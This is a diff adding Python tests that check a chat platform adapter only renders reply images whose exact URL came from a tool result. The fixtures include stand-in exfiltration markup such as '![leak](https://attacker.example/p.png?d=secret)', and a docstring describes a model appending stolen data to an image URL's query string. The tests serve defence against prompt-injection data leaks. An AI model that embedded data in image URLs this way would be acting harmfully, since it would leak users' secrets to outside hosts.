@@ -165,6 +165,58 @@ class TestExtractImages:
         assert "![report](https://example.com/report.pdf)" in cleaned
 
 
+class TestExtractImagesProvenance:
+    """#129975: reply image URLs are only delivered as images when the exact URL
+    string occurred in a tool result; everything else stays in the text."""
+
+    def test_allowed_none_keeps_legacy_behavior(self):
+        content = "![cat](https://example.com/cat.png)"
+        images, cleaned = BasePlatformAdapter.extract_images(content)
+        assert len(images) == 1
+        assert "![cat]" not in cleaned
+
+    def test_provenanced_url_is_extracted_and_stripped(self):
+        content = "Generated: ![gen](https://fal.media/files/abc/output.png)"
+        images, cleaned = BasePlatformAdapter.extract_images(
+            content, allowed_urls={"https://fal.media/files/abc/output.png"})
+        assert images == [("https://fal.media/files/abc/output.png", "gen")]
+        assert "![gen]" not in cleaned
+
+    def test_unprovenanced_url_keeps_markup_in_text(self):
+        content = "See ![leak](https://attacker.example/p.png?d=secret)"
+        images, cleaned = BasePlatformAdapter.extract_images(content, allowed_urls=set())
+        assert images == []
+        # The markup survives verbatim: delivered as a plain link, never fetched.
+        assert "![leak](https://attacker.example/p.png?d=secret)" in cleaned
+
+    def test_modified_tool_url_is_not_provenance(self):
+        """A model appending ?d=<data> to a URL a tool did print produces a
+        different string and must stay unprovenanced (exact match only)."""
+        tool_url = "https://attacker.example/p.png"
+        injected = "![x](https://attacker.example/p.png?d=stolen)"
+        images, cleaned = BasePlatformAdapter.extract_images(injected, allowed_urls={tool_url})
+        assert images == []
+        assert injected in cleaned
+
+    def test_html_img_respects_provenance(self):
+        content = 'A: <img src="https://example.com/a.png"> B: <img src="https://example.com/b.png">'
+        images, cleaned = BasePlatformAdapter.extract_images(
+            content, allowed_urls={"https://example.com/a.png"})
+        assert images == [("https://example.com/a.png", "")]
+        assert '<img src="https://example.com/a.png"' not in cleaned
+        assert '<img src="https://example.com/b.png"' in cleaned
+
+    def test_mixed_reply_only_provenanced_part_is_delivered(self):
+        content = (
+            "![ok](https://replicate.delivery/pbxt/abc/output)\n"
+            "![bad](https://evil.example/x.png)"
+        )
+        images, cleaned = BasePlatformAdapter.extract_images(
+            content, allowed_urls={"https://replicate.delivery/pbxt/abc/output"})
+        assert images == [("https://replicate.delivery/pbxt/abc/output", "ok")]
+        assert "![bad](https://evil.example/x.png)" in cleaned
+
+
 # ---------------------------------------------------------------------------
 # extract_media
 # ---------------------------------------------------------------------------
